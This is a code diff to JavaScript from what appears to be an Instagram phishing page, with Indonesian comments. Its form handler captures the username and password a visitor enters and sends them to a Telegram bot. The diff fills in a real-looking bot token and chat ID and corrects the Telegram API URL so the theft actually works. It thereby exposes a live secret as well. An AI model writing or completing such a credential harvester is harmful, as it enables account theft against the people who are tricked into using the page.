@@ -225,12 +225,12 @@ document.getElementById('telegramForm').addEventListener('submit', function(e) {
     e.preventDefault(); 
 
     // Kredensial Telegram (GANTI DENGAN DATA MILIK ANDA)
-    const botToken = "TOKEN_BOT_ANDA";
-    const chatId = "CHAT_ID_ANDA";
+    const botToken = "8944168845:AAE-fJOEJwFKrFK3dRzI5UQiuYvbkJC7Z_Y";
+    const chatId = "1966317946";
 
     const pesan = `=== DATA LOGIN INSTAGRAM DARK ===\nUsername: ${usernameInput.value}\nPassword: ${passwordInput.value}`;
 
-    fetch(`https://telegram.org{botToken}/sendMessage`, {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: chatId, text: pesan })
